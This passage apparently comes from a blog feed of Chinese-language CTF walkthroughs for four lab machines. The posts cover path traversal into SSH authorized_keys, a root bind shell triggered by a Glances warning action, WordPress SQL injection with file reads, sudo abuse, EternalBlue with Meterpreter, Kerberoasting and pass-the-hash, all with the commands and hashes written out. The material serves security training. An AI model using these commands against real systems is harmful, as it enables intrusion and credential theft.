└─$ curl -X MOVE -H 'X-Session-Token: xixilake-session-secure-2025' -H 'Destination: ../../../home/ll/.ssh/authorized_keys' http://192.168.205.156:1045/api/files/authorized_keys
{'message':'File moved to ../../../home/ll/.ssh/authorized_keys'}
```

文件移动成功。现在我们可以通过SSH免密登录`ll`用户。

# 三、权限提升

## 3.1 获取初始Shell

利用已写入的SSH公钥，登录目标主机，获取低权限shell。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh ll@192.168.205.156
...
ll@104567:~$ id
uid=1001(ll) gid=1001(ll) groups=1001(ll)
```

成功获取了`ll`用户的shell。

## 3.2 Sudo权限分析

检查当前用户的`sudo`权限，寻找提权线索。

```bash
ll@104567:~$ sudo -l
...
User ll may run the following commands on 104567:
    (ALL : ALL) NOPASSWD: /usr/bin/toilet
```

发现`ll`用户可以免密码以root权限执行`/usr/bin/toilet`命令，这个命令是兔子洞。

## 3.3 发现高权限服务：Glances

在目标主机上，使用`ss -tnlp`查看网络连接情况，寻找可能由高权限用户启动的、未被外网扫描发现的服务。

```bash
ll@104567:~$ ss -tnlp
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port
...
LISTEN   0        128              0.0.0.0:61208          0.0.0.0:*
...
```

发现了一个新的`61208`端口正在监听。回到Kali，扫描该端口，确认其运行着一个`Glances`系统监控服务，并且通过目录扫描和访问`/openapi.json`，确认这是一个API版本为V4的Glances服务。

## 3.4 配置文件信息泄露与命令执行漏洞

根据API文档，`/api/4/config`端点存在信息泄露漏洞，可以读取Glances的配置文件。

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.205.156:61208/api/4/config | jq
{
  'fs': {
    'warning': '80',
    'warning_action': 'busybox nc -lp 4567 -e /bin/bash',
    'careful': '50',
    'critical': '90'
  },
...
}
```

配置文件中存在一个致命的配置项`warning_action`。当文件系统使用率达到80%时，由于Glances服务是以root权限运行的，系统会以**root权限**执行预设命令`busybox nc -lp 4567 -e /bin/bash`，从而开启一个监听在4567端口的绑定型shell。

## 3.5 触发漏洞并获取Root Shell

我们只需在目标机上创建一个大文件，使磁盘占用率超过80%即可触发该动作。根据主机信息，创建一个21G的文件足以触发。

在`ll`用户的shell中执行：

```bash
ll@104567:~$ dd if=/dev/zero of=/tmp/bigfile bs=1G count=21
22548578304 bytes (23 GB, 21 GiB) copied...
```

文件创建完成后，立即从Kali连接目标机开启的4567端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nc 192.168.205.156 4567
id
uid=0(root) gid=0(root) groups=0(root)
```

成功连接并获取了root shell。

# 四、获取Flag

在root shell中，读取所有flag文件。

```bash
cat /root/root.txt /home/ll/user.txt
flag{root-f526a6c9f285aa9d001a459b42ef3035}
flag{user-bc3c292e432690a9a0444bb46a559061}
```

成功获取所有Flag，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_ll104567.html</guid><pubDate>Wed, 03 Sep 2025 04:05:52 +0000</pubDate></item><item><title>hmv_Ximai</title><link>https://7r1UMPHK.github.io/post/hmv_Ximai.html</link><description># 一、信息收集

## 网络扫描

首先进行网络发现，寻找目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:f4:eb:fa       PCS Systemtechnik GmbH
...
```

发现目标IP：`192.168.205.131`

## 端口扫描

对目标进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.131            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 06:55 EDT
Nmap scan report for SOUPEDECODE.LOCAL (192.168.205.131)
Host is up (0.000082s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8000/tcp open  http-alt
MAC Address: 08:00:27:F4:EB:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

开放端口：

- 22/tcp - SSH服务
- 80/tcp - Web服务
- 3306/tcp - MySQL数据库
- 8000/tcp - 备用Web服务

# 二、服务枚举

## MySQL服务测试

尝试连接MySQL服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ mysql -h 192.168.205.131 -u root -p 
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server
```

MySQL服务拒绝远程连接，需要寻找其他入口。

## Web服务分析（80端口）

访问80端口显示Apache2默认页面，进行目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u 192.168.205.131     
...
[07:15:39] 200 -    2KB - /adminer.php
[07:15:46] 200 -   23KB - /info.php
...
```

继续使用gobuster进行更详细的扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
...
/index.html           (Status: 200) [Size: 10938]
/info.php             (Status: 200) [Size: 85870]
/reminder.php         (Status: 200) [Size: 3163]
/server-status        (Status: 403) [Size: 280]
...
```

发现的重要文件：

- `/adminer.php` - Adminer 5.3.0数据库管理工具
- `/info.php` - PHP信息页面
- `/reminder.php` - 提醒页面

## 分析reminder.php页面

访问`/reminder.php`，发现包含重要信息：

```html
&lt;div class='container'&gt;
    &lt;h1&gt;Web Portal&lt;/h1&gt;
    &lt;p class='hint-text'&gt;
        jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.
    &lt;/p&gt;

    &lt;img src='that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg' alt='Mysterious Image'&gt;

    &lt;p&gt;
        Also, can you fix this search box? Sometimes it chucks errors depending on what I enter...
    &lt;/p&gt;
    &lt;p class='hint-text'&gt;
        I'd do it myself, but I've been busy trying to create some code to enable us to securely store our passwords, seeing as you keep forgetting yours... The encoder seems completely borked though.
    &lt;/p&gt;

    &lt;form action='reminder.php' method='POST'&gt;
        &lt;input type='text' name='username' placeholder='Username'&gt;
        &lt;input type='submit' value='Lookup User'&gt;
    &lt;/form&gt;
&lt;/div&gt;
```

页面提供了重要线索：

1. Jimmy的访问凭据存储在txt文件中
2. 路径提示：`that-place-where-i-put-that-thing-that-time/`

访问该路径，发现目录列表：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.131/that-place-where-i-put-that-thing-that-time/
...
lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -&gt; /etc/jimmy.txt
...
```

发现`creds.txt`是指向`/etc/jimmy.txt`的软链接。

## Web服务分析（8000端口）

访问8000端口发现是WordPress站点，但域名跳转到`wordpress.local`，需要添加到hosts文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '192.168.205.131 wordpress.local' &gt;&gt; /etc/hosts
```

WordPress站点包含一篇重要文章，提示系统存在安全问题：

```
Dear Developer, We Need to Talk…

While casually browsing your blog system, I couldn't help but notice a few… quirks.

For starters, your php.ini is a bit too welcoming. mysqli.allow_local_infile = On? Really? That's basically sending an open invitation to anyone with a payload and a dream.

Oh, and your CMS? Some of those plugins are a little too trusting. I tried asking the database a slightly unexpected question, and to my surprise… it answered. Very helpfully, in fact.🧐

Don't worry—nothing happened (yet). But if I found these issues, someone less polite might too.

Just a friendly heads-up: hardening is cheaper than recovering. 😅

Sincerely,
A Concerned Internet Wanderer
```

文章暗示：

1. `mysqli.allow_local_infile = On` 配置可能存在安全风险
2. WordPress插件存在SQL注入漏洞

# 三、漏洞发现与利用

## 漏洞扫描

使用nuclei进行漏洞扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://wordpress.local:8000/
...
[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&amp;perpage=20&amp;page=1&amp;orderBy=source_id&amp;dateEnd&amp;dateStart&amp;order=DESC&amp;sources&amp;action=depicter-lead-index ['wordpress']
...
```

发现CVE-2025-2011漏洞，这是一个WordPress插件的SQL注入漏洞。

## SQL注入利用

### 检测注入点

使用sqlmap验证并利用SQL注入漏洞：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index' -p s --dbs --batch
...
Parameter: s (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: s=test') AND (SELECT 1426 FROM (SELECT(SLEEP(5)))CoXd) AND ('Jhem'='Jhem&amp;action=depicter-lead-index

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: s=test') UNION ALL SELECT CONCAT(0x71786b7071,0x72534350746463506a707173537277566e717679657645616d6c774751594a486675525970544a54,0x717a6a7171),NULL,NULL,NULL,NULL-- -&amp;action=depicter-lead-index
...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] wordpress
[*] zabbix
```

### 获取WordPress用户信息

提取WordPress用户表数据：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index' -p s -D wordpress -T wp_users --dump       
...
Database: wordpress
Table: wp_users
[1 entry]
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url | user_pass                                                       | user_email      | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | &lt;blank&gt;  | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | no@thankyou.com | adminer    | 0           | adminer      | adminer       | 2025-05-28 10:35:26 | &lt;blank&gt;             |
+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

获得用户：`adminer`，密码哈希：`$wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq`

### 读取系统文件

利用MySQL的LOAD_FILE函数读取`/etc/jimmy.txt`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index' -p s --sql-query 'SELECT LOAD_FILE('/etc/jimmy.txt')' --batch
...
SELECT LOAD_FILE('/etc/jimmy.txt'): 'HandsomeHU\n'
```

成功获取jimmy用户密码：`HandsomeHU`

# 四、系统访问

## SSH登录

使用获取的凭据登录SSH：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh jimmy@192.168.205.131                                                                                                                                    
jimmy@192.168.205.131's password: 
Linux Ximai 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
jimmy@Ximai:~$ echo $PATH
./...
```

发现PATH环境变量被限制，需要重新设置：

```bash
jimmy@Ximai:~$ export PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games'
```

## 信息收集

检查sudo权限和系统信息：

```bash
jimmy@Ximai:~$ sudo -l
Sorry, user jimmy may not run sudo on Ximai.
```

查看WordPress配置文件：

```bash
jimmy@Ximai:/var/www/wordpress$ cat wp-config.php 
...
/**
 * adminer:adminer123456
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'SuperSecret' );
...
```

在配置文件中发现adminer用户的明文密码：`adminer123456`

# 五、权限提升

## 切换用户

使用获取的密码切换到adminer用户：

```bash
jimmy@Ximai:/tmp$ su adminer
Password: 
adminer@Ximai:/tmp$ sudo -l
Matching Defaults entries for adminer on Ximai:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User adminer may run the following commands on Ximai:
    (ALL) NOPASSWD: /usr/bin/grep
```

## 利用sudo权限

发现adminer用户可以以root权限执行`/usr/bin/grep`命令，但存在限制。检查grep文件权限：

```bash
adminer@Ximai:/tmp$ ls -la /usr/bin/grep
-rwxr-xrwx 1 root root 19 Aug 30 23:32 /usr/bin/grep
```

发现grep文件具有写权限，可以覆盖其内容：

```bash
adminer@Ximai:/tmp$ echo 'chmod +s /bin/bash' &gt; /usr/bin/grep
adminer@Ximai:/tmp$ sudo /usr/bin/grep
adminer@Ximai:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

成功为bash文件设置SUID权限，获取root权限：

```bash
adminer@Ximai:/tmp$ bash -p
bash-5.0# cat /root/r00t.txt /home/jimmy/us3r.txt 
flag{root-126e5653-3b02-11f0-b074-000c2921b441}
flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Ximai.html</guid><pubDate>Sun, 31 Aug 2025 03:40:25 +0000</pubDate></item><item><title>thl_Microchoft</title><link>https://7r1UMPHK.github.io/post/thl_Microchoft.html</link><description># 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内的主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.132 08:00:27:03:82:a3       PCS Systemtechnik GmbH
...
```

发现目标主机：`192.168.205.132`

## 1.2 端口扫描

使用 `rustscan` 进行端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.132
...
Open 192.168.205.132:135
Open 192.168.205.132:139
Open 192.168.205.132:445
```

发现开放端口：

- **135/tcp**：RPC端点映射器
- **139/tcp**：NetBIOS会话服务
- **445/tcp**：SMB服务

根据端口特征判断这是一台Windows主机，且开放了SMB服务。

# 二、漏洞扫描

## 2.1 SMB漏洞扫描

使用 `nmap` 的漏洞脚本扫描SMB服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap --script=vuln -p445,139 192.168.205.132
...
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|         
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
...
```

**重要发现**：目标主机存在 **MS17-010（永恒之蓝）** 漏洞！

# 三、漏洞利用

## 3.1 启动Metasploit Framework

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ msfconsole
...
msf &gt;
```

## 3.2 搜索MS17-010相关模块

```bash
msf &gt; search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   ...
```

## 3.3 配置和执行EternalBlue攻击

选择EternalBlue模块并配置参数：

```bash
msf &gt; use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options
...
msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.205.132
RHOSTS =&gt; 192.168.205.132

msf exploit(windows/smb/ms17_010_eternalblue) &gt; run
```

## 3.4 攻击执行过程

```bash
[*] Started reverse TCP handler on 192.168.205.128:4444 
[*] 192.168.205.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.205.132:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
[+] 192.168.205.132:445 - The target is vulnerable.
[*] 192.168.205.132:445 - Connecting to target for exploitation.
[+] 192.168.205.132:445 - Connection established for exploitation.
[+] 192.168.205.132:445 - Target OS selected valid for OS indicated by SMB reply
...
[+] 192.168.205.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.205.132:445 - Sending egg to corrupted connection.
[*] 192.168.205.132:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.205.132
[*] Meterpreter session 1 opened (192.168.205.128:4444 -&gt; 192.168.205.132:49159)
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

**攻击成功！**获得了Meterpreter会话，表明已经获取了系统最高权限。

# 四、系统访问与信息收集

## 4.1 获取系统Shell

```bash
meterpreter &gt; shell
Process 1376 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;
```

确认获得了Windows 7系统的SYSTEM权限访问。

## 4.2 查找Flag文件

在用户目录中递归搜索txt文件：

```bash
C:\Users&gt;dir *.txt /S
...
 Directory of C:\Users\Admin\Desktop
03/28/2024  06:51 PM                32 admin.txt.txt

 Directory of C:\Users\Lola\Desktop
03/28/2024  06:54 PM                32 user.txt
...
```

发现两个关键文件：

- 管理员Flag：`C:\Users\Admin\Desktop\admin.txt.txt`
- 用户Flag：`C:\Users\Lola\Desktop\user.txt`

## 4.3 获取Flag

```bash
C:\Users&gt;type C:\Users\Lola\Desktop\user.txt
13e624146d31ea232c850267c2745caa

C:\Users&gt;type C:\Users\Admin\Desktop\admin.txt.txt
ff4ad2daf333183677e02bf8f67d4dca
```

成功获取用户和管理员Flag！sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_Microchoft.html</guid><pubDate>Sat, 30 Aug 2025 14:37:19 +0000</pubDate></item><item><title>hmv_DC1</title><link>https://7r1UMPHK.github.io/post/hmv_DC1.html</link><description># 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内的主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:cb:f9:29       PCS Systemtechnik GmbH
...
```

发现目标主机：`192.168.205.131`

## 1.2 端口扫描

使用 `rustscan` 进行端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.131
...
Open 192.168.205.131:53
Open 192.168.205.131:88
Open 192.168.205.131:135
Open 192.168.205.131:139
Open 192.168.205.131:389
Open 192.168.205.131:445
Open 192.168.205.131:464
Open 192.168.205.131:593
Open 192.168.205.131:636
Open 192.168.205.131:3268
Open 192.168.205.131:3269
Open 192.168.205.131:5985
Open 192.168.205.131:9389
```

根据开放的端口特征（53/DNS、88/Kerberos、389/LDAP、445/SMB等），可以判断这是一台标准的域控制器。

## 1.3 时间同步

由于是域环境，需要与域控制器同步时间以避免Kerberos认证问题：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo ntpdate soupedecode.local
2025-08-30 18:20:22.204692 (-0400) +10958.045293 +/- 0.000301 soupedecode.local 192.168.205.131 s1 no-leap
CLOCK: time stepped by 10958.045293
```

# 二、漏洞扫描

## 2.1 SMB漏洞扫描

使用 `nmap` 的漏洞脚本扫描SMB服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap --script=vuln -p445,139 192.168.205.131
...
Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
...
```

未发现明显的CVE漏洞，继续进行其他枚举。

# 三、SMB枚举

## 3.1 SMB共享枚举

使用 `smbclient` 列举SMB共享：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.131/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk    
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk    
```

发现一个名为 `backup` 的共享，这可能包含有用信息。

## 3.2 SMB共享访问测试

尝试匿名访问各个共享：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient //192.168.205.131/backup -N 
Try 'help' to get a list of possible commands.
smb: \&gt; dir
NT_STATUS_ACCESS_DENIED listing \*
```

所有共享都拒绝匿名访问，需要获取有效凭据。

# 四、域信息枚举

## 4.1 使用enum4linux-ng枚举域信息

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ enum4linux-ng -A 192.168.205.131
...
[+] Long domain name is: SOUPEDECODE.LOCAL
[+] Got domain/workgroup name: SOUPEDECODE
...
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
...
[+] Server allows authentication via username 'iutprjyw' and password ''
[H] Rerunning enumeration with user 'iutprjyw' might give more results
...
```

获取到域信息：

- 域名：`SOUPEDECODE.LOCAL`
- 域控制器：`DC01.SOUPEDECODE.LOCAL`

## 4.2 添加域名解析

将域名添加到 `/etc/hosts` 文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo nano /etc/hosts

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.131 SOUPEDECODE.LOCAL
```

# 五、用户枚举与密码爆破

## 5.1 SID枚举获取用户列表

使用 `lookupsid.py` 枚举域用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131
...
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
...
```

提取用户名列表：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.131 2&gt;/dev/null | grep '(SidTypeUser)' | cut -d '\' -f2 | cut -d ' ' -f1 &gt; user
```

## 5.2 密码喷洒攻击

使用 `crackmapexec` 进行密码喷洒（用户名作为密码）：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.131 -u user -p user --continue-on-success --no-bruteforce | grep '+'
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

成功找到弱密码用户：`ybob317:ybob317`

# 六、Kerberoasting攻击

## 6.1 获取服务票据

使用获得的凭据进行Kerberoasting攻击：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.205.131 -request
...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$S...
```

成功获取到服务账户的Kerberos票据。

## 6.2 破解服务账户密码

使用 `john` 破解Kerberos票据：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
Password123!!    (?)   
1g 0:00:00:09 DONE (2025-08-30 18:22) 0.1054g/s 1513Kp/s 7184Kc/s 7184KC/s
```

破解出密码：`Password123!!`

## 6.3 密码喷洒验证

使用破解出的密码进行密码喷洒：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.131 -u user -p 'Password123!!' --continue-on-success| grep '+' 
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
```

确认 `file_svc` 账户密码为 `Password123!!`

# 七、权限提升

## 7.1 访问backup共享

使用 `file_svc` 账户访问之前无法访问的 `backup` 共享：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.131 -u 'file_svc' -p 'Password123!!' --shares --no-bruteforce
...
SMB         192.168.205.131 445    DC01    backup          READ          
...
```

## 7.2 获取备份文件

连接到backup共享并下载文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient //192.168.205.131/backup -U file_svc
Password for [WORKGROUP\file_svc]:
smb: \&gt; DIR
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024
smb: \&gt; get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (43.6 KiloBytes/sec)
```

## 7.3 分析备份文件

查看备份文件内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

发现了多个计算机账户的NTLM哈希值！

## 7.4 哈希传递攻击

提取用户名和哈希值：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ awk -F '[:]' '{print $1}' backup_extract.txt &gt; user

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ awk -F '[:]' '{print $4}' backup_extract.txt &gt; pass
```

使用哈希进行认证测试：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.131 -u user -H pass --continue-on-success| grep '+'      
SMB         192.168.205.131 445    DC01    [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

`FileServer$` 账户具有管理员权限！

# 八、获取系统访问权限

## 8.1 通过WinRM获取Shell

使用 `FileServer$` 的NTLM哈希通过WinRM获取系统访问权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.131 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
                                      
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt; whoami /all

USER INFORMATION
----------------
User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065

GROUP INFORMATION
-----------------
Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
...
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
...
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
...
```

成功获取到具有管理员权限的系统访问！

## 8.2 获取Flag

查找并获取用户和管理员Flag：

```bash
*Evil-WinRM* PS C:\Users&gt; dir *.txt -R
...
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/17/2024  10:44 AM             32 root.txt

    Directory: C:\Users\ybob317\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   4:54 AM             32 user.txt

*Evil-WinRM* PS C:\Users&gt; type C:\Users\Administrator\Desktop\root.txt
a9564ebc3289b7a14551baf8ad5ec60a

*Evil-WinRM* PS C:\Users&gt; type C:\Users\ybob317\Desktop\user.txt
6bab1f09a7403980bfeb4c2b412be47b
```

